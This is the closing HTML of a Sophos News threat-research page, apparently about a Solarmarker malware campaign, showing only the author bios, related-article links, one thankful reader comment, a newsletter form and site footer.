				<div class="max-w-4xl mx-auto">
					<div class="article-author-block article-co-authors-block">
	
					<div class="author-block">
				<div class="author-block__profile">
					<img width="400" height="400" src="https://news.sophos.com/wp-content/uploads/2020/01/gabor-szappanos-threat-research-director-sophosLabs.jpeg?w=400" class="avatar avatar-400 photo wp-post-image" alt="" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/gabor-szappanos/" title="Posts by Gabor Szappanos" class="author url fn" rel="author">Gabor Szappanos</a>						</h3>

						
							<div class="author-block__bio">
								<p>Gabor graduated from the Eotvos Lorand University of Budapest with a degree in physics. His first job was in the Computer and Automation Research Institute, developing diagnostic software and hardware for nuclear power plants. He started antivirus work in 1995, and began developing freeware antivirus solutions in his spare time. Gabor joined VirusBuster in 2001 where he was responsible for taking care of macro virus and script malware and became head of the virus lab in 2002. In 2008 he became a member of the Board of Directors in AMTSO (Anti Malware Testing Standards Organization) and, in 2012, joined Sophos as a Principal Malware Researcher.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
					<div class="author-block">
				<div class="author-block__profile">
					<img width="400" height="400" src="https://news.sophos.com/wp-content/uploads/2020/02/sean-gallagher.jpg?w=400" class="avatar avatar-400 photo wp-post-image" alt="Sean Gallagher" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/sean-gallagher/" title="Posts by Sean Gallagher" class="author url fn" rel="author">Sean Gallagher</a>						</h3>

						
							<div class="author-block__bio">
								<p>Sean Gallagher is Principal Threat Researcher, Sophos X-Ops. Prior to joining Sophos, he was an information security and technology journalist for over 30 years, including 10 as information security and national security editor for Ars Technica.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
		
		</div>
				</div>
			</div>

			
<div class="pb-24 bg-white">
<div class="container">
<div class="max-w-5xl mx-auto">

			
			<h3 class="text-style-h2 md:my-8 my-4">
				Read Similar Articles			</h3>

			<div class="article-grid article-grid--3-column">
				<!-- Article -->
<article
	id="post-75410"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75410 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations tag-encryption tag-mtr tag-ransomware tag-security tag-sidebar tag-sophos-rapid-response region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-ransomware-web-banner-1200x628px-option-2.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 24, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What to expect when you’ve been hit with Avaddon ransomware</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75301"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75301 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-intercept-x tag-sidebar tag-sophos-edr tag-sophos-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-edr-news-blog-image-838x440px@2x.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What&#8217;s New in Sophos EDR 4.0</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75396"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75396 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-sidebar tag-sophos-xdr tag-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-xdr.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">Sophos XDR: Driven by data</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
			</div>

	
</div>
</div>
</div> <!-- #secondary -->

			
<div class="bg-sophos-gray-50 px-4 pt-16 pb-8" id="comments">

			<div class="container max-w-4xl bg-white py-6 md:py-16 rounded-md">
		<h2 class="text-style-h2-lg mb-6 md:mb-12">
			<span>1</span> Comment		</h2>

		<section class="comments-list">
		<article class="comment even thread-even depth-1  " id="comment-350198" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Mike Jones											</h2>
					<time class="comment-meta-item" datetime="2022-02-13T14:27-05:00" itemprop="datePublished"><a href="#comment-350198" itemprop="url">13 February 2022 at 2:27 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>This is great information and very helpful.<br />
Thank you Gabor and Sean for such detailed information, screenshots, and all of your research. Then taking the time to share it with all of us.<br />
All of your efforts and documentation helped me find and remove two instances of this malware.</p>
									</div>
			</div>

	</article></section>
				</div>
	
		<p class="no-comments">Comments are closed.</p>
	
	<div class="container max-w-2xl py-6 md:py-16">
			</div>

</div><!-- #comments -->
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


	</div> <!-- #content -->

	

	<div class="bg-sophos-gray-50 md:py-16 px-4 pb-4 pt-8">
		<div class="container max-w-2xl" x-show="!subscribed">
			<div class="text-style-h2-lg">
				Subscribe to get the latest updates in your inbox.			</div>
			<div id="mc_embed_shell">
				<link href="//cdn-images.mailchimp.com/embedcode/classic-061523.css" rel="stylesheet" type="text/css">
				<style type="text/css">
					
					/* Add your own Mailchimp form style overrides in your site stylesheet or in this style block.
					We recommend moving this block and the preceding CSS link to the HEAD of your HTML file. */
					#mc_embed_signup form, #mc_embed_signup #mc-embedded-subscribe-form div.mce_inline_error { margin:0; background: transparent; }
					#mc_embed_signup input { border-color: rgba(240, 242, 244, var(--tw-border-opacity)); }
					#mc_embed_signup input#mc-embedded-subscribe { border-radius: 9999px; }
					#mc-embedded-subscribe { margin-left:0; }
					#mc_embed_signup .mc-field-group.input-group input { height:1rem; width:1rem; }
					#mc_embed_signup #mc-embedded-subscribe-form input.mce_inline_error { border-color: rgba( 209, 213, 219, var( --tw-border-opacity ) );}
					#mc_embed_signup #mce-success-response { display: block;  color: #fff; font-weight: normal;  padding: .75rem 1rem; margin: 0; }
					#mc_embed_signup div#mce-responses { padding: 0; width: 100%; margin: .5rem 0; }
					#mc_embed_signup div.response { width:100%; padding: .75rem 1rem; font-weight: normal; }
				</style>
    
				<div id="mc_embed_signup">
					<form action="https://sophos.us2.list-manage.com/subscribe/post?u=2a2849a8c809119f4bd4929cc&amp;id=8d6471d831&amp;f_id=007062e1f0" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank">
						<div id="mc_embed_signup_scroll">
							<div class="mc-field-group">
								<input type="email" name="EMAIL" class="required email" id="mce-EMAIL" required="" value="" placeholder="name@email.com">
								<div id="mce-responses" class="clear flex flex-col my-6">
									<div class="response font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md" id="mce-error-response" style="display: none;"></div>
									<div class="response font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md" id="mce-success-response" style="display: none;"></div>
								</div>
							</div>
							
							<div class="mc-field-group input-group mb-4 text-lg">
								Which categories are you interested in?
								<ul>
									<li><input type="checkbox" name="group[3][1]" id="mce-group[3]-3-0" value=""><label for="mce-group[3]-3-0" class="text-style-form-label ml-2">Products and Services</label></li>
									<li><input type="checkbox" name="group[3][2]" id="mce-group[3]-3-1" value=""><label for="mce-group[3]-3-1" class="text-style-form-label ml-2">Threat Research</label></li>
									<li><input type="checkbox" name="group[3][4]" id="mce-group[3]-3-2" value=""><label for="mce-group[3]-3-2" class="text-style-form-label ml-2">Security Operations</label></li>
									<li><input type="checkbox" name="group[3][8]" id="mce-group[3]-3-3" value=""><label for="mce-group[3]-3-3" class="text-style-form-label ml-2">AI Research</label></li>
									<li><input type="checkbox" name="group[3][16]" id="mce-group[3]-3-4" value=""><label for="mce-group[3]-3-4" class="text-style-form-label ml-2">#SophosLife</label></li>
								</ul>
							</div>
							
							<div aria-hidden="true" style="position: absolute; left: -5000px;">
								<input type="text" name="b_2a2849a8c809119f4bd4929cc_8d6471d831" tabindex="-1" value="">
							</div>
							<div class="clear">
								<input type="submit" name="subscribe" id="mc-embedded-subscribe" class="round-button round-button--primary" value="Subscribe">
							</div>
						</div>
					</form>
				</div>
			</div>

		</div>
	</div>


	<footer
		class="bg-white border-t border-sophos-gray-200 "
		x-data="{ languageMenu: false, privacyMenu: false, legalMenu: false }"
	>
		<div class="container">
			<div class="md:flex-row md:items-center flex flex-col justify-between py-8">
				<div class="flex items-baseline flex-grow space-x-6">
					<!-- Language -->
					
<div class="relative mr-auto">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="languageMenu = !languageMenu"
		@click.away="languageMenu = false"
	>
		Change Region		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': languageMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>

	<!-- Language Menu -->
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="languageMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
											<li>
					<a href="https://news.sophos.com/es-419">
						América Latina					</a>
				</li>
															<li>
					<a href="https://news.sophos.com/pt-br">
						Brasil					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/de-de">
						Deutschland					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/en-us">
						English					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/fr-fr">
						France					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/es-es">
						Iberia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/it-it">
						Italia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/ja-jp">
						Japan					</a>
				</li>
									</ul>
	</div>
</div>

					<!-- Terms -->
					<a
						href="https://www.sophos.com/en-us/legal/sophos-website.aspx"
						class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block ml-auto text-xs font-medium leading-tight"
						>Terms</a
					>

					<!-- Privacy -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="privacyMenu = !privacyMenu"
		@click.away="privacyMenu = false"
	>
		Privacy
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': privacyMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="privacyMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx"
				>
					Privacy Notice				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/cookie-information.aspx"
				>
					Cookies				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Legal -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="legalMenu = !legalMenu"
		@click.away="legalMenu = false"
	>
		Legal
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': legalMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="legalMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal.aspx"
				>
					General				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx"
				>
					Modern Slavery Statement				</a>
			</li>
			<li>
				<a
					href="https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html"
				>
					Speak Out				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Copyright -->
					<div class="md:ml-6 mt-2 md:mt-0">
						<span
							class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
						>
							&copy; 1997 - 2024 Sophos Ltd. All rights reserved						</span>
					</div>
				</div>
			</div>
			</div>
		</div>
	</footer>
			<div id="amp-mobile-version-switcher" hidden>
			<a rel="" href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?amp=1">
				Go to mobile version			</a>
		</div>

				<script type="text/javascript" id="sophos-js-core-js-extra">
/* <![CDATA[ */
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
/* ]]> */
</script>
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJyVjFEOwiAQBS8ku0Ka1H4Yz0LIpgVlIexqPb6YXqAk72sy83CvJhRWYkXdKJOglLoVYdrFuKudMUlfl8ozkvk4cGA7gANAkgue+gilDdj01eblvH8geGt8jVfB5+rjysNh9U2Z2nC3+uHkz3r0yHc7O7dM9rZM6Qegq6BH" ></script><script type="text/javascript" src="https://unpkg.com/alpinejs@2.8.1/dist/alpine.js?ver=2.0.3" id="alpine-js-js"></script>
<script type="text/javascript" src="https://news.sophos.com/wp-content/themes/sophosnews-2017/js/sophos-mc-validate.js?m=1730121999g" ></script><script type="text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"166161023\",\"post\":\"81186\",\"tz\":\"-5\",\"srv\":\"news.sophos.com\",\"hp\":\"vip\",\"j\":\"1:14.0\"}") ]);
_stq.push([ "clickTrackerInit", "166161023", "81186" ]);
/* ]]> */
</script>
</body>
</html>
